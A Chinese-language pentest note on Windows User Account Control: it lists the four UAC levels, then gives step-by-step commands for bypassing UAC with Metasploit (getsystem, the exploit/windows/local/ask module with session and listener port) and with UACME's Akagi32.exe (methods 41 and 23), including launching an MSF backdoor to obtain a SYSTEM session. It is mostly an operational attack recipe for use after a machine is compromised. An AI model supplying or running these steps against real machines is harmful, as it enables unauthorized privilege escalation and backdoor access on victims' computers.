<https://www.freebuf.com/articles/web/288239.html>
UAC是Windows系统中的一种安全机制，用于防止恶意软件在没有管理员权限的情况下执行操作（弹出弹窗手动确定才能运行）。

UAC四个等级：
```
始终通知：这是最严格的设置，每当有程序需要使用高级别的权限时都会提示本地用户。
仅在程序试图更改我的计算机时通知我(UAC的默认设置)：当本地Windows程序要使用高级别的权限时，不会通知用户。但是，当第三方程序要使用高级别的权限时，会提示本地用户。
仅在程序试图更改我的计算机时通知我(不降低桌面的亮度)：与上一条设置的要求相同，但在提示用户时不降低桌面的亮度
从不提示：当用户为系统管理员时，所有程序都会以最高权限运行。
```
bypassUAC：
为了远程执行目标的exe或者bat可执行文件绕过此安全机制，以此叫bypassUAC
绕过项目：MSF内置（推荐），Powershell渗透框架，UACME项目（推荐）
有的exp可能会自动绕过UAC，如烂土豆BadPotato可能还会尝试绕过UAC。


## **MSF的bypassUAC提权**
msf上线后会话中
```
getsystem //自动寻找msf中提权
getuid
```
win10+有UAC保护时，可能不成功。

此时可以搜索bypassUAC模块使用。
>使用前提有两个：
>一是系统当前用户必须在管理员组中
>二是用户账户控制程序UAC设置为默认，即"仅在程序试图更改我的计算机时通知我"
```
search uac 查看对应系统版本的
use exploit/windows/local/ask    ##选择模块
sessions         ##查看后台会话
set session 1    ##选择应用的会话ID
set lport 5555   ##设置监听端口，有时候返回回来会出现错误，所以就另起一个监听。
```
模块选择：
![image-20240504235841953](http://cdn.33129999.xyz/mk_img/image-20240504235841953.png)

^
## **UACME工具绕过UAC**
支持大部分win10/11和win服务器。
需要用VS编译成exe，也可以网上用现成版exe。Akagi32.exe和Akagi64.exe
<https://github.com/hfiref0x/UACME>
使用：
上传目标主机后运行，绕过UAC配合MSF提权。
```
有70个绕过，41和23，61最好用
Akagi32.exe 41
Akagi32.exe 23
此时弹出新的cmd，里面运行的是高权限，且不会触发UAC

运行MSF后门程序上线
Akagi32.exe 41  ./msf.exe

此时MSF监听上线，进入会话
getsystem //成功不提示UAC提权至system
getuid
```